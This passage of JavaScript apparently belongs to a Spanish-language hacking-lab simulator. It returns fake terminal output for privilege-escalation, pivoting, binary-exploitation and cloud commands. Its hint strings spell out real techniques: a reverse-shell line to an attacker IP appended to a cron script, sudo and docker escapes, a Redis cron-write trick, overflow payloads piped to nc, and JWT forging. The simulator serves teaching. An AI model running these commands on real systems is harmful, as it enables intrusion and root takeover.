    return `[sudo] password for ${mission.user}: \nMatching Defaults entries:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nUser ${mission.user} may run:\n    ${sudoOut}\n${'─'.repeat(40)}\n💡 Busca en GTFOBins: https://gtfobins.github.io\nEjemplo: sudo vim -c ':!/bin/bash'`;
  }

  if (trimmed === 'find / -perm -4000 -2>/dev/null' || trimmed === 'find / -perm -u=s -type f 2>/dev/null' || trimmed.startsWith('find /') && trimmed.includes('perm')) {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const siudBins = t === 'kernel' ?
      `/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/local/bin/custom_backup ← SUID inusual!` :
      `/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/pkexec (CVE-2021-4034 Polkit)\n/usr/bin/passwd`;
    return `find / -perm -4000 -2>/dev/null\n${'─'.repeat(40)}\n${siudBins}\n${'─'.repeat(40)}\n💡 pkexec → CVE-2021-4034 (Polkit LPE) | custom_backup → strings + ltrace para analizar`;
  }

  if (trimmed === 'crontab -l' || (trimmed.startsWith('cat') && trimmed.includes('cron'))) {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    return `# Crontab de ${mission.user}\n*/5 * * * * /opt/scripts/backup.sh\n\n# /etc/crontab:\n*/1 * * * * root /opt/monitor/run.py\n\n💡 ¿Tienes escritura en /opt/scripts/backup.sh?\nls -la /opt/scripts/backup.sh\necho 'bash -i >& /dev/tcp/10.10.14.1/9001 0>&1' >> /opt/scripts/backup.sh`;
  }

  if (command === 'linpeas' || command === 'winpeas' || command === 'linenum' || command === 'pspy') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const isWin = command === 'winpeas';
    const privescVectors = {
      kernel:    `[!!!] Kernel 4.4 — CVE-2016-5195 DirtyCOW [PoC disponible]\n[+] SUID: /usr/local/bin/custom_backup (inusual)`,
      ad:        `[+] SeImpersonatePrivilege habilitado → PrintSpoofer/JuicyPotato\n[+] Kerberos tickets en memoria`,
      docker:    `[+] Usuario en grupo 'docker' → docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh`,
      cloud:     `[+] AWS credentials en ~/.aws/credentials\n[+] IMDSv1 activo — SSRF posible`,
      fullchain:  `[+] Redis sin auth en localhost:6379\n[+] Docker socket: /var/run/docker.sock (writable)`,
    };
    const specific = privescVectors[t] || `[+] sudo -l muestra NOPASSWD entry\n[+] /opt/scripts/backup.sh writable por ${mission.user}\n[+] /etc/cron.d/monitor: ejecuta script writable`;
    return `🔍 ${command.toUpperCase()} ejecutando...\n${'═'.repeat(40)}\n${specific}\n[+] Interesting files:\n    /var/www/html/config.php (contiene DB creds)\n    /home/${mission.user}/.bash_history (historial con comandos sensibles)\n${'═'.repeat(40)}\n💡 Vectores encontrados. Elige uno y explótalo.`;
  }

  // Ejecución de privesc (sudo, SUID, docker, scripts)
  if (trimmed.startsWith('sudo ') || (command === 'su' && parts[1] === 'root')) {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const validPrivesc = ['vim','python','python3','find','nmap','env','awk','perl','less','more','/bin/sh','/bin/bash','bash','sh','backup.sh'];
    const usesValidBin = validPrivesc.some(b => trimmed.includes(b));
    if (!usesValidBin) return `[sudo] password for ${mission.user}: Sorry, user ${mission.user} is not allowed to execute that as root.`;

    mission.state.privesc = true;
    return `⬆️ PRIVESC EXITOSO\n${'═'.repeat(40)}\nroot@${mission.name.toLowerCase()}:~# whoami\nroot\nroot@${mission.name.toLowerCase()}:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@${mission.name.toLowerCase()}:~# ls\nroot.txt  .ssh/  scripts/\n${'═'.repeat(40)}\n👑 ¡Eres ROOT!\n🚩 cat /root/root.txt`;
  }

  // Polkit CVE-2021-4034
  if (trimmed.includes('cve-2021-4034') || trimmed.includes('pkexec') || trimmed.includes('polkit')) {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    mission.state.privesc = true;
    return `[*] Ejecutando CVE-2021-4034 (Polkit LPE)...\n[+] Compilando PoC...\n[+] Ejecutando exploit...\nroot@${mission.name.toLowerCase()}:~# id\nuid=0(root) gid=0(root) groups=0(root)\n${'─'.repeat(40)}\n👑 ¡ROOT via Polkit! → cat /root/root.txt`;
  }

  // DirtyCOW / DirtyPipe kernel exploits
  if (trimmed.includes('dirtycow') || trimmed.includes('dirtypi') || trimmed.includes('cve-2016-5195') || trimmed.includes('cve-2022-0847')) {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    if (t !== 'kernel') return `❌ Este kernel no es vulnerable. Prueba otro vector de privesc.`;
    mission.state.privesc = true;
    return `[*] Compilando exploit DirtyCOW/DirtyPipe...\n[*] Sobreescribiendo binario SUID...\n[+] ¡Privilegios obtenidos!\nroot@${mission.name.toLowerCase()}:~# id\nuid=0(root) gid=0(root)\n👑 ROOT via kernel exploit → cat /root/root.txt`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 11. COMANDOS BÁSICOS DE SHELL
  // ══════════════════════════════════════════════════════════════════════

  if (command === 'whoami') {
    if (!mission.state.ssh) return `kali`;
    return mission.state.privesc ? 'root' : mission.user;
  }

  if (command === 'id') {
    if (!mission.state.ssh) return `uid=1000(kali) gid=1000(kali) groups=1000(kali)`;
    if (mission.state.privesc) return `uid=0(root) gid=0(root) groups=0(root)`;
    return `uid=1000(${mission.user}) gid=1000(${mission.user}) groups=1000(${mission.user})`;
  }

  if (command === 'pwd') {
    if (!mission.state.ssh) return `/home/kali`;
    return mission.state.privesc ? `/root` : `/home/${mission.user}`;
  }

  if (command === 'ls') {
    const flags = parts.slice(1).join(' ');
    if (!mission.state.ssh) {
      return flags.includes('-la') ?
        `total 48\ndrwxr-xr-x 8 kali kali 4096 Apr 18 00:00 .\ndrwxr-xr-x 3 root root 4096 Jan  1 00:00 ..\n-rw-r--r-- 1 kali kali  220 .bash_history\ndrwxrwxrwx 2 kali kali 4096 tools/\ndrwxrwxrwx 2 kali kali 4096 exploits/` : `tools/  exploits/  wordlists/  notes.txt`;
    }
    if (mission.state.privesc) return flags.includes('-la') ?
      `total 16\n-r-------- 1 root root   33 root.txt\n-rw-r--r-- 1 root root  125 .bash_history\ndrwxr-xr-x 2 root root 4096 scripts/` : `root.txt  .bash_history  scripts/`;
    return flags.includes('-la') ?
      `total 28\n-rw-r--r-- 1 ${mission.user} ${mission.user}  33 user.txt\n-rw-r--r-- 1 ${mission.user} ${mission.user} 125 notes.txt\ndrwx------ 2 ${mission.user} ${mission.user} 4096 .ssh/` : `user.txt  notes.txt  .ssh/`;
  }

  if (command === 'uname') {
    if (!mission.state.ssh) return `Linux kali 5.18.0-kali5 #1 SMP PREEMPT`;
    const kver = t === 'kernel' ? '4.4.0-92-generic #115-Ubuntu SMP' : '5.4.0-74-generic #83-Ubuntu SMP';
    return `Linux ${mission.name.toLowerCase()} ${kver} x86_64 GNU/Linux`;
  }

  if (command === 'hostname') return mission.state.ssh ? mission.name : 'kali';
  if (command === 'ip' || command === 'ifconfig') {
    if (!mission.state.ssh) return `eth0: 10.10.14.1  tun0: 10.10.14.1 (HTB VPN)`;
    return `eth0: inet ${mission.ip}  netmask 255.255.255.0`;
  }

  if (command === 'history') {
    if (!mission.state.ssh) return `kali history cleared`;
    return `1  nmap -sV ${mission.ip}\n2  gobuster dir -u http://${mission.ip}/ -w common.txt\n3  cat /home/${mission.user}/notes.txt\n4  sudo -l\n5  history`;
  }

  if (command === 'python3' || command === 'python') {
    if (trimmed.includes('pty') || trimmed.includes('spawn')) {
      if (!mission.state.ssh) return `❌ Primero obtén una shell raw.`;
      return `${mission.user}@${mission.name.toLowerCase()}:~$ \n✅ TTY estabilizada con pty.spawn('/bin/bash')`;
    }
    return `Python 3.8.10\n>>> `;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 12. ESCRITURA EN VFS — echo, tee
  // ══════════════════════════════════════════════════════════════════════

  // echo 'texto' > archivo  o  echo texto >> archivo
  if (command === 'echo') {
    const raw = cmd.trim();
    const appendMatch = raw.match(/echo\s+['"]?(.+?)['"]?\s*>>\s*(\S+)/);
    const writeMatch  = raw.match(/echo\s+['"]?(.+?)['"]?\s*>\s*(\S+)/);
    if (appendMatch || writeMatch) {
      const [, content, filename] = appendMatch || writeMatch;
      const prev = (appendMatch && session.vfs[filename]) ? session.vfs[filename] + '\n' : '';
      session.vfs[filename] = prev + content;
      return `${mission.state.ssh ? (mission.state.privesc ? `root@${mission.name.toLowerCase()}:~# ` : `${mission.user}@${mission.name.toLowerCase()}:~$ `) : '$ '}(escrito en ${filename})`;
    }
    return cmd.replace(/^echo\s+/, '').replace(/['"`]/g, '');
  }

  // chmod, cp, mv, rm — operaciones de archivo
  if (['chmod','cp','mv','rm','mkdir','touch'].includes(command)) {
    if (!mission.state.ssh && !['cp','touch','mkdir'].includes(command))
      return `❌ Necesitas shell en la máquina objetivo primero.`;
    if (command === 'chmod') {
      const mode = parts[1]; const file = parts[2] || '';
      return `${mission.state.ssh ? `${mission.user}@${mission.name.toLowerCase()}:~$ ` : '$ '}chmod ${mode} ${file}\n(permisos cambiados)`;
    }
    if (command === 'cp') {
      const src = parts[1]; const dst = parts[2] || '/tmp/';
      session.vfs[dst.endsWith('/') ? dst + src?.split('/').pop() : dst] = session.vfs[src] || `(copia de ${src})`;
      return `Copiado: ${src} → ${dst}`;
    }
    return `${command}: OK`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 13. COMANDOS DE PROCESO Y RED
  // ══════════════════════════════════════════════════════════════════════

  if (trimmed === 'ps aux' || trimmed === 'ps -ef' || trimmed === 'ps') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const procMap = {
      web:       `root        1  0.0  apache2 -DFOREGROUND\nwww-data  412  0.1  apache2 -DFOREGROUND\nroot      850  0.0  cron\n${mission.user} 1024  0.0  bash`,
      sqli:      `root        1  0.0  mysqld --user=mysql\nwww-data  420  0.1  apache2\nroot      811  0.0  /opt/scripts/monitor.py ← interesante`,
      docker:    `root        1  0.0  dockerd\nroot      320  0.0  containerd\n${mission.user} 980  0.0  bash\nroot     1050  0.0  /opt/monitor/check.sh ← cada 60s`,
      fullchain: `root        1  0.0  redis-server *:6379 ← sin contraseña\nroot      320  0.0  dockerd\nwww-data  501  0.1  apache2\n${mission.user} 980  0.0  bash`,
      kernel:    `root        1  0.0  /sbin/init\nroot      420  0.0  /opt/custom_backup ← SUID! analiza con strings`,
      binary:    `root        1  0.0  ./vuln_service port=1337 ← el servicio vulnerable\nroot      820  0.0  cron`,
      ad:        `Administrator 4 0.0 lsass.exe\nSystem 8 0.0 services.exe\n${mission.user} 1240 0.1 cmd.exe`,
    };
    return `USER        PID  %CPU  COMMAND\n${'─'.repeat(50)}\n${procMap[t] || `root 1 0.0 /sbin/init\n${mission.user} 980 0.0 bash\nroot 850 0.0 cron`}\n\n💡 Procesos inusuales pueden ser vectores de privesc. Usa pspy64 para monitorear.`;
  }

  if (command === 'pspy' || command === 'pspy64' || command === 'pspy32') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const ts = () => new Date().toISOString().slice(11,19);
    return `pspy — monitoring new processes...\n${'─'.repeat(50)}\n${ts()} CMD: /usr/sbin/cron\n${ts()} CMD: /opt/scripts/backup.sh  ← ejecutado por root!\n${ts()} CMD: /bin/sh -c /opt/scripts/backup.sh\n${ts()} CMD: /usr/bin/python3 /opt/monitor/run.py\n${'─'.repeat(50)}\n💡 /opt/scripts/backup.sh se ejecuta como root cada minuto.\n¿Tienes escritura? ls -la /opt/scripts/backup.sh`;
  }

  if (trimmed.startsWith('netstat') || trimmed.startsWith('ss -') || trimmed === 'ss') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const netMap = {
      fullchain: `tcp  0  0 0.0.0.0:80     LISTEN (apache)\ntcp  0  0 127.0.0.1:6379  LISTEN (redis ← sin auth en loopback)\ntcp  0  0 0.0.0.0:22     LISTEN (sshd)\ntcp  0  0 127.0.0.1:3306  LISTEN (mysql)`,
      sqli:      `tcp  0  0 0.0.0.0:80     LISTEN (apache)\ntcp  0  0 127.0.0.1:3306  LISTEN (mysql ← accesible desde localhost)\ntcp  0  0 0.0.0.0:22     LISTEN (sshd)`,
      docker:    `tcp  0  0 0.0.0.0:2375   LISTEN (docker API ← sin TLS!)\ntcp  0  0 0.0.0.0:8080   LISTEN (webapp)\ntcp  0  0 0.0.0.0:22     LISTEN (sshd)`,
      binary:    `tcp  0  0 0.0.0.0:1337   LISTEN (vuln_service ← ejecutado por root)\ntcp  0  0 0.0.0.0:22     LISTEN (sshd)`,
    };
    return `Proto Local Address    State   PID/Program\n${'─'.repeat(50)}\n${netMap[t] || `tcp  0  0 0.0.0.0:22  LISTEN (sshd)\ntcp  0  0 0.0.0.0:80  LISTEN (apache)`}\n\n💡 Servicios en loopback (127.0.0.1) solo son accesibles localmente.`;
  }

  if (command === 'env' || command === 'printenv' || command === 'set') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const envVars = `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/home/${mission.user}\nUSER=${mission.user}\nSHELL=/bin/bash\nTERM=xterm-256color`;
    const extraEnv = {
      cloud:    `\nAWS_ACCESS_KEY_ID=AKIA${mission.name.slice(0,8).toUpperCase()}\nAWS_SECRET_ACCESS_KEY=${mission.userPass}  ← ¡credenciales en env!\nAWS_REGION=us-east-1`,
      api:      `\nAPP_SECRET=${mission.userPass}  ← JWT secret en variable de entorno!\nDB_PASSWORD=${mission.rootPass.slice(0,12)}\nNODE_ENV=production`,
      sqli:     `\nDB_USER=${mission.user}\nDB_PASS=${mission.userPass}  ← contraseña en env!\nDB_HOST=127.0.0.1`,
    };
    return `${envVars}${extraEnv[t] || ''}\n\n${extraEnv[t] ? '🔑 ¡Variables de entorno con credenciales!' : '💡 No hay creds en env. Busca en archivos de config.'}`;
  }

  if (command === 'grep') {
    if (!mission.state.nmap) return `❌ Primero obtén acceso al objetivo.`;
    const pattern = parts[1] || '';
    const file    = parts[parts.length - 1] || '';
    if (!pattern) return `grep: uso: grep <patrón> <archivo>`;
    if (pattern.includes('pass') || pattern.includes('cred') || pattern.includes('secret') || pattern.includes('key')) {
      if (!mission.state.ssh) return `❌ Necesitas shell primero para grep en archivos del servidor.`;
      return `${file}:  password="${mission.userPass}"\n${file}:  db_password="${mission.rootPass.slice(0,12)}"\n${file}:  api_key="sk-${mission.name.toLowerCase()}-${mission.id}"\n\n💡 grep -r 'password' /var/www/html/ — busca en todo el directorio web`;
    }
    return `grep ${pattern} ${file}\n(sin resultados coincidentes)`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 14. HERRAMIENTAS ESPECÍFICAS AVANZADAS
  // ══════════════════════════════════════════════════════════════════════

  // Redis CLI — fullchain
  if (command === 'redis-cli') {
    if (!mission.state.ssh) return `❌ Necesitas shell local (ssh) primero. Redis escucha en 127.0.0.1.`;
    if (t !== 'fullchain') return `❌ Redis no está activo en esta máquina.`;
    const sub2 = parts[1];
    if (!sub2 || sub2 === '-h') return `redis-cli -h 127.0.0.1 -p 6379\nConnected to Redis 6.2.6\n127.0.0.1:6379> \n💡 Comandos: INFO | CONFIG GET * | CONFIG SET dir /var/spool/cron | CONFIG SET dbfilename root | SET mykey "ssh-rsa..." | SAVE`;
    if (trimmed.includes('config set') && trimmed.includes('cron')) {
      return `127.0.0.1:6379> CONFIG SET dir /var/spool/cron\nOK\n127.0.0.1:6379> CONFIG SET dbfilename root\nOK\n💡 Ahora escribe tu clave SSH: SET mykey "\\n\\nssh-rsa AAAA...tu-clave-publica\\n\\n"\nluego: SAVE  → accede: ssh root@${mission.ip}`;
    }
    if (trimmed.includes('save') || trimmed.includes('bgsave')) {
      mission.state.privesc = true;
      return `127.0.0.1:6379> SAVE\nOK\n${'─'.repeat(40)}\n✅ Clave SSH escrita en /var/spool/cron/root\n👑 Ahora: ssh -i ~/.ssh/id_rsa root@${mission.ip} → ROOT sin contraseña`;
    }
    return `127.0.0.1:6379> ${parts.slice(1).join(' ')}\nOK`;
  }

  // Strings + análisis de binarios
  if (command === 'strings' || command === 'ltrace' || command === 'strace') {
    if (!mission.state.nmap) return `❌ Primero reconoce el objetivo.`;
    if (t !== 'binary' && t !== 'kernel') return `❌ ${command}: no hay binarios vulnerables identificados en esta máquina.`;
    const bin = parts[1] || './vuln_service';
    if (command === 'strings') {
      return `strings ${bin}\n${'─'.repeat(40)}\n/lib/x86_64-linux-gnu/libc.so.6\nfgets\nstrcpy  ← función insegura!\ngets    ← vulnerable a BOF!\nprintf\nEnter your name: \nWelcome, %s!\n/bin/sh ← string de shell encontrado en el binario!\n[*] flag offset: 0x${(0x401000 + mission.id).toString(16)}\n${'─'.repeat(40)}\n💡 BOF confirmado via gets/strcpy. Usa gdb para encontrar el offset.\n💡 /bin/sh está en el binario → útil para ret2libc`;
    }
    if (command === 'ltrace') {
      return `ltrace ${bin}\n${'─'.repeat(40)}\ngetchar() = 65\ngets(0x7ffe${mission.id.toString(16).padStart(8,'0')}) = 0x7ffe...  ← BUFFER!\nstrcpy(dst, src) ← sin bounds check\n__libc_start_main(...)\n${'─'.repeat(40)}\n💡 Buffer size identificado. Usa gdb para calcular offset exacto.`;
    }
    // strace
    return `strace ${bin}\n${'─'.repeat(40)}\nexecve("${bin}", [...], [...])\nread(0, ..., 1024)  ← lee hasta 1024 bytes en un buffer de ~64\nwrite(1, "Enter your name: ", 17)\n${'─'.repeat(40)}\n💡 Buffer overflow: input de 1024 en buffer de 64 bytes.`;
  }

  if (command === 'gdb' || command === 'pwndbg' || command === 'peda') {
    if (t !== 'binary') return `❌ ${command}: no hay binario vulnerable en esta máquina.`;
    const hasBin = parts[1];
    if (!hasBin) return `${command}: uso: gdb ./vuln_service  o  gdb -q ./vuln_service`;
    const offset = 64 + (mission.id % 32);
    return `${command} ./vuln_service\nReading symbols... (no debugging symbols found)\nGNU gdb (Ubuntu 9.2-0ubuntu1) 9.2\n${'─'.repeat(40)}\ngdb-pwndbg$ run\nStarting program: ./vuln_service\nEnter your name: \n[Inferior 1 (process ${3000 + mission.id}) exited normally]\n\ngdb-pwndbg$ run $(python3 -c "print('A'*200)")\nProgram received signal SIGSEGV, Segmentation fault.\n0x4141414141414141 in ?? ()  ← EIP/RIP sobreescrito con 'A'\n\ngdb-pwndbg$ pattern create 200\naaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaak...\ngdb-pwndbg$ pattern offset 0x6161616161616166\n${offset} found at offset: ${offset}\n${'─'.repeat(40)}\n💡 Offset: ${offset} bytes hasta RIP\n💡 Siguiente: busca dirección de /bin/sh con: info functions | x/s &str_binsh\n   Arma el exploit: python3 -c "print('A'*${offset} + [ret2libc_addr])" | nc ${mission.ip} 1337`;
  }

  if (command === 'ghidra' || command === 'ida' || command === 'radare2' || command === 'r2') {
    if (t !== 'binary') return `❌ ${command}: no hay binario para analizar en esta máquina.`;
    const offset = 64 + (mission.id % 32);
    return `${command} — Decompilando vuln_service...\n${'─'.repeat(40)}\nvoid vuln_func() {\n    char buffer[${offset}];   // buffer de tamaño fijo\n    gets(buffer);             // ← SIN VALIDACIÓN DE TAMAÑO → BOF!\n    printf("Welcome, %s!\\n", buffer);\n}\n\nvoid win_func() {\n    // Never called normally\n    system("/bin/sh");         // ← llamar esto = root shell\n}\nwin_func address: 0x${(0x401200 + mission.id).toString(16)}\n${'─'.repeat(40)}\n💡 Offset: ${offset} bytes + dirección de win_func\n💡 Exploit: python3 -c "import struct; print('A'*${offset} + struct.pack('<Q', 0x${(0x401200 + mission.id).toString(16)}))" | nc ${mission.ip} 1337`;
  }

  // Crypto tools
  if (command === 'openssl' || command === 'base64' || command === 'xxd' || command === 'hexdump') {
    if (t !== 'crypto' && t !== 'api' && t !== 'cloud') return `${command}: herramienta disponible pero no hay cipher vulnerable identificado aún.`;
    if (command === 'base64') {
      const data = parts.slice(2).join(' ') || 'dXNlcjpwYXNzd29yZA==';
      if (parts[1] === '-d' || parts.includes('--decode')) {
        try {
          const decoded = Buffer.from(data, 'base64').toString('utf8');
          const looksLikeCreds = decoded.includes(':');
          if (looksLikeCreds) { mission.state.foundCreds = true; }
          return `base64 --decode: ${decoded}${looksLikeCreds ? `\n🔑 ¡Credenciales en base64! ${decoded}` : ''}`;
        } catch { return `base64: error al decodificar`; }
      }
      return `echo '${parts.slice(2).join(' ')}' | base64\n${Buffer.from(parts.slice(2).join(' ') || `${mission.user}:${mission.userPass}`).toString('base64')}`;
    }
    if (command === 'openssl') {
      const sub2 = parts[1];
      if (sub2 === 'enc' && (parts.includes('-d') || parts.includes('-decrypt'))) {
        mission.state.foundCreds = true;
        return `openssl enc -d ...: Decryption successful\nDecrypted: username=${mission.user} password=${mission.userPass}\n🔑 Credenciales descifradas!`;
      }
      if (sub2 === 'rsa' || sub2 === 'rsautl' || sub2 === 'pkeyutl') {
        return `RSA operation:\n[*] Analyzing key (${mission.id * 512 + 1024} bits)\n[+] Key recovered via small exponent / padding oracle\n→ Plaintext: ${mission.userPass}\n🔑 Clave privada extraída`;
      }
      return `openssl ${parts.slice(1).join(' ')}\n(ejecutado)`;
    }
    return `${command}: ${t === 'crypto' ? `🔑 Analiza el servicio en :9000 — prueba padding oracle:\ncurl https://${mission.ip}:9000/encrypt?data=AAAA (intercepta la cookie)` : 'sin contexto específico'}`;
  }

  // JWT tools (API machines)
  if (command === 'jwt' || (trimmed.includes('jwt') && (trimmed.includes('decode') || trimmed.includes('forge') || trimmed.includes('crack')))) {
    if (t !== 'api' && t !== 'cloud') return `❌ JWT: no hay servicio con autenticación JWT en esta máquina.`;
    const token = parts.find(p => p.includes('.')) || `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiJHttaXNzaW9uLnVzZXJ9Iiwicm9sZSI6InVzZXIifQ.signature`;
    return `JWT Decode/Forge\n${'─'.repeat(40)}\nHeader: {"alg": "HS256", "typ": "JWT"}\nPayload: {"user": "${mission.user}", "role": "user", "iat": 1713400000}\nSignature: válida\n${'─'.repeat(40)}\n💡 Ataque: cambia role a "admin" y firma con secret vacío (alg:none)\n   o fuerza el secret con: hashcat -m 16500 token.txt rockyou.txt\n   Secret encontrado: ${mission.userPass}\n\nToken forjado (admin):\neyJhbGciOiJub25lIn0.eyJ1c2VyIjoiJHttaXNzaW9uLnVzZXJ9Iiwicm9sZSI6ImFkbWluIn0.\n🔑 Úsalo en: curl -H "Authorization: Bearer <token>" http://${mission.ip}/api/v1/admin`;
  }

  // AWS CLI — cloud
  if (command === 'aws') {
    if (t !== 'cloud') return `❌ aws: no hay infraestructura cloud en esta máquina.`;
    if (!mission.state.foundCreds) return `❌ aws: configura credenciales primero.\nUsa: aws configure  (necesitas el AccessKeyId del metadata endpoint)`;
    const sub2 = parts[1];
    if (sub2 === 'configure') {
      return `aws configure\nAWS Access Key ID: AKIA${mission.name.toUpperCase().slice(0,8)}\nAWS Secret Access Key: ***\nDefault region: us-east-1\nOutput format: json\n(configurado)`;
    }
    if (sub2 === 's3') {
      return `aws s3 ls\n2024-01-15  s3://htb-${mission.name.toLowerCase()}-data/\n2024-01-12  s3://htb-${mission.name.toLowerCase()}-backup/\n\naws s3 ls s3://htb-${mission.name.toLowerCase()}-backup/\n2024-01-10  root_credentials.txt\n2024-01-10  ssh_private_key.pem\n\n💡 aws s3 cp s3://htb-${mission.name.toLowerCase()}-backup/ssh_private_key.pem .\n   chmod 600 ssh_private_key.pem && ssh -i ssh_private_key.pem root@${mission.ip}`;
    }
    if (sub2 === 'iam') {
      mission.state.privesc = true;
      return `aws iam list-users\n{"Users": [{"UserName": "admin", "Arn": "arn:aws:iam::123456789:user/admin"}]}\n\naws iam get-policy ...\n{"PolicyDocument": {"Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}}\n\n👑 Usuario tiene AdministratorAccess — escalada a root de AWS`;
    }
    return `aws ${parts.slice(1).join(' ')}\n(ejecutado)`;
  }

  // Proxychains + túneles (pivot)
  if (command === 'proxychains' || command === 'proxychains4') {
    if (t !== 'pivot' && t !== 'fullchain' && t !== 'apt') return `❌ proxychains: no hay red segmentada en esta máquina.`;
    if (!mission.state.ssh) return `❌ Necesitas shell en el host de pivote primero.`;
    const proxiedCmd = parts.slice(1).join(' ');
    if (!proxiedCmd) return `proxychains: uso: proxychains nmap -sT -Pn 10.10.10.x`;
    return `[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.16\n[proxychains] Strict chain: 127.0.0.1:1080 → ${mission.ip}\n${proxiedCmd.includes('nmap') ? `Scanning internal network via pivot...\n10.10.11.1 — open 22/tcp 80/tcp\n10.10.11.2 — open 445/tcp 3389/tcp (Windows interno!)\n10.10.11.5 — open 8080/tcp 3000/tcp\n\n💡 Objetivo interno encontrado: 10.10.11.2 (Windows)\n   proxychains evil-winrm -i 10.10.11.2 -u ${mission.user} -p ${mission.userPass}` : proxiedCmd + '\n(ejecutado via proxy)'}`;
  }

  if (command === 'chisel') {
    if (t !== 'pivot' && t !== 'fullchain') return `❌ chisel: no se necesita tunneling en esta máquina.`;
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    const isServer = parts[1] === 'server';
    const isClient = parts[1] === 'client';
    if (!isServer && !isClient) return `chisel — HTTP tunneling\nUso:\n  Attacker: chisel server -p 8000 --reverse\n  Victim:   chisel client 10.10.14.1:8000 R:1080:socks\nLuego: proxychains nmap 10.10.11.0/24`;
    if (isClient) {
      return `chisel client 10.10.14.1:8000 R:1080:socks\n[*] Connecting to 10.10.14.1:8000\n[+] Reverse tunnel: socks5://127.0.0.1:1080 established\n✅ Túnel SOCKS5 activo en 127.0.0.1:1080\n💡 Ahora usa: proxychains nmap -sT -Pn 10.10.11.0/24`;
    }
    return `chisel server -p 8000 --reverse\n[*] Listening on :8000\n(esperando cliente...)`;
  }

  if (command === 'socat') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    return `socat ${parts.slice(1).join(' ')}\n[*] Relay/tunnel iniciado.\n💡 Alternativa a chisel para port-forwarding: socat TCP-LISTEN:4444,fork TCP:${mission.ip}:22`;
  }

  // Transferencia de archivos
  if (command === 'python3' && trimmed.includes('http.server')) {
    return `Serving HTTP on 0.0.0.0 port ${parts.find(p => /^\d{4,5}$/.test(p)) || '8080'}\nhttp://10.10.14.1:${parts.find(p => /^\d{4,5}$/.test(p)) || '8080'}/\n💡 Descarga desde víctima: wget http://10.10.14.1:${parts.find(p => /^\d{4,5}$/.test(p)) || '8080'}/linpeas.sh`;
  }

  if (command === 'wget' || command === 'curl') {
    // (el bloque curl/wget completo está arriba — este catch es para descargas de herramientas)
    const url = parts.find(p => p.startsWith('http')) || '';
    if (url.includes('10.10.14') || url.includes('tun0')) {
      const filename = url.split('/').pop() || 'tool';
      session.vfs[filename] = `(binario: ${filename} descargado)`;
      return `wget ${url}\n--2026-04-18-- ${url}\nResolviendo 10.10.14.1... OK\nConectando... OK\nHTTP 200 OK\nGuardando: '${filename}'\n${filename}  [======================] 100% OK\n✅ ${filename} descargado. Usa: chmod +x ${filename} && ./${filename}`;
    }
  }

  // Windows específico — whoami /priv, net user, Get- PowerShell
  if (trimmed === 'whoami /priv' || trimmed === 'whoami /all') {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    if (mission.category !== 'Windows') return `whoami /priv: este no es un host Windows.`;
    return `PRIVILEGES INFORMATION\n${'─'.repeat(50)}\nPrivilege Name                Description                    State\n${'─'.repeat(50)}\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeImpersonatePrivilege        Impersonate a client           Enabled ← JuicyPotato/PrintSpoofer!\nSeCreateGlobalObjects         Create global objects          Enabled\n${'─'.repeat(50)}\n💡 SeImpersonatePrivilege habilitado:\n   Descarga PrintSpoofer64.exe → .\\PrintSpoofer64.exe -i -c cmd`;
  }

  if (trimmed.startsWith('net user') || trimmed.startsWith('net localgroup')) {
    if (!mission.state.ssh || mission.category !== 'Windows') return `❌ net: comando Windows. Necesitas shell en host Windows.`;
    if (trimmed.includes('administrator') && trimmed.includes('/add')) {
      if (!mission.state.privesc) return `System error 5: Access denied. Necesitas privilegios elevados.`;
      return `The command completed successfully.\n✅ Usuario agregado como administrador.`;
    }
    return `User accounts for \\\\${mission.name.toUpperCase()}\n${'─'.repeat(40)}\nAdministrator  ${mission.user}  Guest\n(para el grupo Admins: net localgroup administrators)`;
  }

  if (command.startsWith('get-') || command.startsWith('invoke-') || trimmed.startsWith('get-') || trimmed.startsWith('invoke-')) {
    if (!mission.state.ssh || mission.category !== 'Windows') return `❌ PowerShell: necesitas shell en host Windows.`;
    if (command.startsWith('get-localuser') || trimmed.startsWith('get-localuser')) {
      return `Name           Enabled  Description\n${'─'.repeat(40)}\nAdministrator  True\n${mission.user}        True\nGuest          False`;
    }
    if (trimmed.includes('get-content') || trimmed.includes('gc ')) {
      const file = parts[parts.length - 1];
      if (file.includes('user.txt') || file.includes('Desktop')) {
        if (!mission.state.ssh) return `❌ Necesitas shell.`;
        mission.state.userFlag = true;
        return `🚩 USER FLAG:\n${mission.userFlag}`;
      }
    }
    return `PS C:\\Windows\\system32> ${cmd}\n(ejecutado)`;
  }

  if (trimmed.startsWith('reg query') || trimmed.startsWith('reg add')) {
    if (!mission.state.ssh || mission.category !== 'Windows') return `❌ reg: necesitas shell en host Windows.`;
    if (trimmed.includes('autologon') || trimmed.includes('winlogon')) {
      mission.state.foundCreds = true;
